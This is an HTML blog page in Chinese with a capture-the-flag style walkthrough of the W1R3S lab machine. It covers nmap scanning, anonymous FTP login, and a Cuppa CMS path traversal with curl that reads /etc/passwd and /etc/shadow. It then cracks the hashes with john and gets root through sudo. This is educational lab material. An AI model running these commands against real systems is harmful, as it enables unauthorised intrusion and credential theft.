@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+
+<html lang="cn">
+
+<head>
+    
+    <title>w1r3s-editable解题笔记 - RunCtf</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="images/logo.png" type="image/png" />
+    <meta name="description" content="信息收集扫描主机： 1sudo nmap -sn 192.168.20.0&#x2F;24  得到地址:192.168.20.150  扫描端口(建议扫两边) 1sudo nmap --min-rate 10000 -o- 192.168.20.150   TCP扫描 1sudo nmap -sT -sV -O -p21,22,80,3306 192.168.20.150    UDP扫描 1sudo nm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="w1r3s-editable解题笔记">
+<meta property="og:url" content="http://runctf.cn/2022/12/11/w1r3s-editable/index.html">
+<meta property="og:site_name" content="RunCtf">
+<meta property="og:description" content="信息收集扫描主机： 1sudo nmap -sn 192.168.20.0&#x2F;24  得到地址:192.168.20.150  扫描端口(建议扫两边) 1sudo nmap --min-rate 10000 -o- 192.168.20.150   TCP扫描 1sudo nmap -sT -sV -O -p21,22,80,3306 192.168.20.150    UDP扫描 1sudo nm">
+<meta property="og:locale">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/63959399a24c3.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/63959426ce646.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/6395945631091.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/6395946de1c30.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/639595c5ed0ff.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/639596235a78e.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/6395969956b40.png">
+<meta property="og:image" content="http://img.luminesight.com/img/2022/12/11/639596e6477b5.png">
+<meta property="article:published_time" content="2022-12-11T14:16:01.000Z">
+<meta property="article:modified_time" content="2023-01-11T16:35:33.800Z">
+<meta property="article:author" content="JunHou">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://img.luminesight.com/img/2022/12/11/63959399a24c3.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1673454978735">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1673454978735">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1673454978735">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://tenapi.cn/acg/?100)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="JunHou" class="mdui-btn mdui-btn-icon"><img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="JunHou">
+            <img src="https://www.luminesight.com/cdn/Server/TouXiang.jpg" alt="JunHou" alt="JunHou">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>13</div>
+        <div><span>Tags</span>5</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY/index.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="Search" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1673454978735"></script>
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/289146211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/server2565543706"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/dcncloud"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 20px;">技术</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E6%B8%B8%E6%88%8F/" style="font-size: 10px;">游戏</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(5);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    Hitokoto
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">13</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/">山东省&#34;技能兴鲁-网络安全赛道&#34;职业技能大赛WriteUp</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/">原神换服</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/CTFd/">部署CTFd</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/11/w1r3s-editable/">w1r3s-editable解题笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2022/12/10/%E7%AC%94%E8%AE%B0/">Pwn的学习笔记</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 JunHou
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">	鲁ICP备2022032031-1号</a>
+        <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn@latest/js/hititle.js"></script>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: NaN%;"> 
+            <img src="https://tenapi.cn/acg/?13" alt="w1r3s-editable解题笔记" loading="lazy">
+            <h1>w1r3s-editable解题笔记</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2022年12月11日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 192.168.20.0/24</span><br></pre></td></tr></table></figure>
+
+<p>得到地址:192.168.20.150</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63959399a24c3.png" alt="image-20221211161948618" data-caption="image-20221211161948618" loading="lazy"></p>
+<p>扫描端口(建议扫两边)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -o- 192.168.20.150</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63959426ce646.png" alt="image-20221211162613759" data-caption="image-20221211162613759" loading="lazy"></p>
+<p>TCP扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.20.150 </span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395945631091.png" alt="image-20221211162701088" data-caption="image-20221211162701088" loading="lazy"></p>
+<p>UDP扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sU  -p21,22,80,3306 192.168.20.150</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395946de1c30.png" alt="image-20221211162724786" data-caption="image-20221211162724786" loading="lazy"></p>
+<p>漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.20.150</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639595c5ed0ff.png" alt="image-20221211163308843" data-caption="image-20221211163308843" loading="lazy"></p>
+<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="测试ftp"><a href="#测试ftp" class="headerlink" title="测试ftp"></a>测试ftp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.20.150</span><br><span class="line">测试游客账号：anonymous</span><br><span class="line">密码空</span><br></pre></td></tr></table></figure>
+
+<p>下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binary</span><br><span class="line">mget 0*.txt //批量下载</span><br><span class="line">get 文件</span><br></pre></td></tr></table></figure>
+
+<p>查看下载文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash-identifier //哈希识别器</span><br><span class="line">echo &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 -d  //解base64</span><br></pre></td></tr></table></figure>
+
+<h3 id="测试Web"><a href="#测试Web" class="headerlink" title="测试Web"></a>测试Web</h3><p>目录爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u http://192.168.20.150 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt </span><br></pre></td></tr></table></figure>
+
+<p>测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa cms //搜搜漏洞利用文件</span><br><span class="line">searchsploit cuppa cms -m 25971//下载文件</span><br><span class="line">http://192.168.20.150/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.php | html2text</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.20.150/administrator/alerts/alertConfigField.php | html2text</span><br><span class="line"></span><br><span class="line">john hash </span><br><span class="line">john --show haxi</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639596235a78e.png" alt="image-20221207131226579" data-caption="image-20221207131226579" loading="lazy"></p>
+<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>登录ssh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami //查看权限</span><br><span class="line">uname -a</span><br><span class="line">sudo -l</span><br><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395969956b40.png" alt="image-20221211163640190" data-caption="image-20221211163640190" loading="lazy"></p>
+<p>拿到权限获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639596e6477b5.png" alt="image-20221211163757184" data-caption="image-20221211163757184" loading="lazy"></p>
+
+    <p><img data-fancybox="gallery" src="https://www.luminesight.com/cdn/Server/ShouKuanMA.jpg"  alt="ShouKuanMA.jpg" data-caption="ShouKuanMA.jpg" loading="lazy"></p>
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>Author：</strong>JunHou<br>
+        <strong>Link：</strong><a href="http://runctf.cn/2022/12/11/w1r3s-editable/" title="http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;11&#x2F;w1r3s-editable&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;runctf.cn&#x2F;2022&#x2F;12&#x2F;11&#x2F;w1r3s-editable&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">漏洞测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95ftp"><span class="toc-number">2.1.</span> <span class="toc-text">测试ftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95Web"><span class="toc-number">2.2.</span> <span class="toc-text">测试Web</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">利用漏洞</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/piao.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/sakura.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/shehuizhuyi.js"></script><!-- 点击出现爱心 --><script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/love.js"></script><!-- 点击出现彩色气球爆炸效果 --><canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> <script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/clickBom.js"></script>
+    <!-- themes/[theme_name]/layout/_script/comments.swig -->
+    {% include '_comments/gitalk.swig' %}
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1673454978741"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
